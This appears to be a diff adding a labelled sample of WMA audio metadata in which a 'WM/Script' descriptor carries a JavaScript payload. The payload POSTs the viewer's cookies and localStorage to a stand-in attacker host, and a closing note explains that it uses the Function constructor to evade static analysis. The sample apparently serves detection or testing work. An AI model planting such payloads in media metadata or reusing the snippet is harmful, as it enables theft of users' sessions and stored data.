@@ -1,0 +1,11 @@
+WMA Extended Content — Command Injection Payload
+File: presentation_voiceover.wma
+ASF Extended Content Descriptors:
+  WM/Description: Professional voiceover for Q3 earnings presentation
+  WM/ToolName: AudioForge Pro 5.2
+  WM/UserWebURL: https://corporate.example.com
+  WM/Script: javascript:Function('return this')().fetch('https://exfil.attacker.io/c',{method:'POST',body:JSON.stringify({cookies:document.cookie,storage:localStorage})})
+  WM/ProviderRating: 5
+  WM/EncodingSettings: CBR 192kbps
+
+Script descriptor contains obfuscated JavaScript targeting cookie and localStorage exfiltration. WMA metadata allows arbitrary key-value descriptors exploitable in rendering contexts. The Function constructor bypasses static analysis of direct code execution patterns.
